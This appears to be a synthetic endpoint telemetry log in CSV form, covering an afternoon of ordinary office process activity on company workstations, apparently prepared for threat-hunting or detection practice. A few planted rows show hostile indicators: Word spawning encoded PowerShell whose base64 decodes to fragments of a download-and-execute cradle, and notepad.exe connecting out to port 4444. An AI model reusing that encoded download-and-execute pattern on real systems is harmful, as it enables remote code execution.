timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-05 13:56:00,sales-lt-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 13:57:00,ops-ws-01,irfan,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-05 13:58:00,corp-ws-03,alice,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 13:59:00,eng-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",185.199.108.153,443,outlook
2026-04-05 14:00:00,corp-ws-04,alice,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-05 14:01:00,fin-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-05 14:02:00,fin-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.0.5,445,none
2026-04-05 14:03:00,corp-ws-03,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 14:04:00,corp-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 14:05:00,ops-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.1.12,0,none
2026-04-05 14:06:00,ops-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.2.10.15,445,none
2026-04-05 14:07:00,corp-ws-03,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 14:08:00,eng-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 14:09:00,fin-ws-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
2026-04-05 14:10:00,eng-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 14:11:00,ops-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,msedge
2026-04-05 14:12:00,corp-ws-03,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-05 14:13:00,hr-ws-01,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 14:14:00,sales-lt-01,liam,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 14:15:00,corp-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",45.33.32.156,443,outlook
2026-04-05 14:16:00,corp-ws-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",104.18.20.12,443,outlook
2026-04-05 14:17:00,sales-lt-01,george,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-05 14:18:00,corp-ws-03,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",172.16.4.25,445,none
2026-04-05 14:19:00,corp-ws-03,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 14:20:00,corp-ws-04,george,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 14:21:00,fin-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.0.2.20,0,none
2026-04-05 14:22:00,eng-ws-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",192.168.1.12,0,none
2026-04-05 14:23:00,ops-ws-02,alice,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 14:24:00,hr-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",192.168.1.12,445,none
2026-04-05 14:24:00,corp-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-05 14:25:00,ops-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 14:25:00,corp-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-05 14:26:00,fin-ws-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",172.16.10.8,0,none
2026-04-05 14:27:00,corp-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-05 14:28:00,sales-lt-01,farah,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-05 14:29:00,ops-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-05 14:30:00,corp-ws-04,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 14:31:00,corp-ws-01,liam,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-05 14:32:00,fin-ws-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-05 14:33:00,eng-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 14:34:00,eng-ws-02,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-05 14:35:00,fin-ws-02,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,151.101.1.69,443,teams-client
2026-04-05 14:36:00,corp-ws-02,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 14:37:00,eng-ws-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 14:38:00,fin-ws-02,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 14:39:00,eng-ws-02,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 14:40:00,fin-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",23.45.67.89,443,outlook
2026-04-05 14:41:00,eng-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-05 14:42:00,hr-ws-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 14:43:00,corp-ws-04,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-05 14:44:00,ops-ws-02,julia,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 14:45:00,eng-ws-02,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-05 14:46:00,corp-ws-04,charlie,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-05 14:47:00,eng-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-05 14:48:00,corp-ws-04,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",52.95.110.1,443,outlook
2026-04-05 14:49:00,sales-lt-01,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-05 14:50:00,fin-ws-02,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,151.101.1.69,443,teams-client
2026-04-05 14:51:00,corp-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-05 14:52:00,ops-ws-02,liam,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-05 14:53:00,fin-ws-01,liam,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 14:54:00,sales-lt-01,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 14:55:00,corp-ws-03,farah,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-05 14:56:00,corp-ws-04,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 14:57:00,corp-ws-03,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-05 14:58:00,sales-lt-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.4.25,445,none
2026-04-05 14:59:00,fin-ws-02,liam,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 15:00:00,ops-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-05 15:01:00,fin-ws-02,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 15:02:00,eng-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-05 15:03:00,corp-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-05 15:04:00,sales-lt-01,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-05 15:05:00,ops-ws-02,liam,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-05 15:06:00,fin-ws-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.0.10,0,none
2026-04-05 15:07:00,eng-ws-02,karen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-05 15:08:00,fin-ws-02,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 15:09:00,ops-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",192.168.1.12,445,none
2026-04-05 15:10:00,ops-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-05 15:11:00,corp-ws-03,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.2.20,445,none
2026-04-05 15:12:00,ops-ws-02,karen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-05 15:13:00,fin-ws-01,liam,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 15:14:00,hr-ws-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 15:15:00,eng-ws-01,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-05 15:16:00,corp-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 15:17:00,eng-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.0.10,0,none
2026-04-05 15:17:00,corp-ws-03,liam,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-05 15:18:00,eng-ws-02,charlie,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 15:18:00,corp-ws-03,liam,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-05 15:19:00,eng-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 15:19:00,corp-ws-03,liam,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-05 15:20:00,corp-ws-04,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",185.199.108.153,443,outlook
2026-04-05 15:21:00,fin-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 15:22:00,sales-lt-01,farah,excel.exe,explorer.exe,excel.exe /background,10.2.10.15,0,none
2026-04-05 15:23:00,fin-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-05 15:24:00,eng-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
2026-04-05 15:25:00,sales-lt-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-05 15:26:00,corp-ws-03,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 15:27:00,ops-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 15:28:00,fin-ws-01,alice,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.10,0,none
2026-04-05 15:29:00,hr-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-05 15:30:00,fin-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 15:31:00,corp-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 15:32:00,hr-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 15:33:00,corp-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 15:34:00,corp-ws-04,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",172.16.10.8,0,none
2026-04-05 15:35:00,ops-ws-01,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 15:36:00,corp-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-05 15:37:00,hr-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 15:38:00,hr-ws-01,karen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-05 15:39:00,sales-lt-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 15:40:00,fin-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 15:41:00,corp-ws-03,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 15:42:00,eng-ws-02,karen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
2026-04-05 15:43:00,fin-ws-01,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",10.0.1.15,0,none
2026-04-05 15:44:00,corp-ws-04,helen,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 15:45:00,eng-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-05 15:46:00,corp-ws-03,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 15:47:00,ops-ws-02,liam,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 15:48:00,hr-ws-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 15:49:00,ops-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",104.18.20.12,443,outlook
2026-04-05 15:50:00,fin-ws-02,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 15:51:00,fin-ws-02,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 15:52:00,hr-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-05 15:53:00,eng-ws-02,ethan,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-05 15:54:00,hr-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 15:55:00,ops-ws-01,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 15:55:00,corp-ws-01,liam,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-05 15:56:00,hr-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 15:56:00,corp-ws-01,liam,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-05 15:57:00,eng-ws-02,farah,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-05 15:57:00,corp-ws-01,liam,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-05 15:58:00,fin-ws-01,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 15:59:00,eng-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-05 16:00:00,fin-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-05 16:01:00,corp-ws-04,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 16:02:00,eng-ws-02,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",1.1.1.1,443,outlook
2026-04-05 16:03:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,1.1.1.1,443,slack-client
2026-04-05 16:04:00,fin-ws-01,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-05 16:05:00,corp-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 16:06:00,eng-ws-02,alice,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 16:07:00,corp-ws-04,karen,code.exe,explorer.exe,"code.exe ""C:\Users\karen\Documents\project""",10.0.0.10,445,none
2026-04-05 16:08:00,ops-ws-01,karen,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 16:09:00,corp-ws-01,liam,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\liam\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 16:10:00,sales-lt-01,liam,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 16:11:00,corp-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-05 16:12:00,ops-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",151.101.1.69,443,outlook
2026-04-05 16:13:00,corp-ws-03,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,151.101.1.69,443,teams-client
2026-04-05 16:14:00,fin-ws-02,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",10.2.10.15,445,none
2026-04-05 16:15:00,sales-lt-01,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-05 16:16:00,ops-ws-02,bob,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 16:17:00,fin-ws-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 16:18:00,sales-lt-01,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 16:19:00,corp-ws-04,george,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 16:20:00,corp-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 16:21:00,fin-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 16:22:00,ops-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 16:23:00,ops-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 16:24:00,ops-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-05 16:25:00,fin-ws-01,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 16:26:00,fin-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",192.168.10.9,0,none
2026-04-05 16:27:00,eng-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",1.1.1.1,443,outlook
2026-04-05 16:28:00,corp-ws-02,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",192.168.1.12,0,none
2026-04-05 16:29:00,corp-ws-03,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 16:30:00,corp-ws-02,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-05 16:31:00,ops-ws-02,karen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-05 16:32:00,corp-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.0.10,0,none
2026-04-05 16:33:00,corp-ws-02,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-05 16:34:00,fin-ws-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 16:35:00,corp-ws-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 16:36:00,ops-ws-01,liam,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\liam\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 16:37:00,corp-ws-03,helen,winword.exe,explorer.exe,winword.exe /background,10.2.10.15,0,none
2026-04-05 16:38:00,ops-ws-02,diana,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 16:39:00,fin-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 16:40:00,corp-ws-04,george,slack.exe,explorer.exe,slack.exe --background-task-mode,52.95.110.1,443,slack-client
2026-04-05 16:41:00,corp-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.0.1.15,0,none
2026-04-05 16:42:00,corp-ws-03,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-05 16:43:00,fin-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 16:44:00,hr-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",172.16.10.8,445,none
2026-04-05 16:45:00,corp-ws-02,karen,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-05 16:46:00,fin-ws-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-05 16:47:00,sales-lt-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 16:48:00,fin-ws-01,karen,outlook.exe,explorer.exe,"outlook.exe /recycle ""karen@company.com""",151.101.1.69,443,outlook
2026-04-05 16:49:00,corp-ws-03,george,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-05 16:50:00,sales-lt-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-05 16:51:00,sales-lt-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 16:52:00,corp-ws-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-05 16:53:00,corp-ws-03,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,msedge
2026-04-05 16:54:00,fin-ws-02,george,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 16:55:00,hr-ws-01,bob,slack.exe,explorer.exe,slack.exe --background-task-mode,142.250.183.14,443,slack-client
2026-04-05 16:56:00,ops-ws-02,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 16:57:00,corp-ws-02,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-05 16:58:00,corp-ws-04,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 16:59:00,eng-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",172.16.4.25,0,none
2026-04-05 17:00:00,corp-ws-04,george,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 17:01:00,eng-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
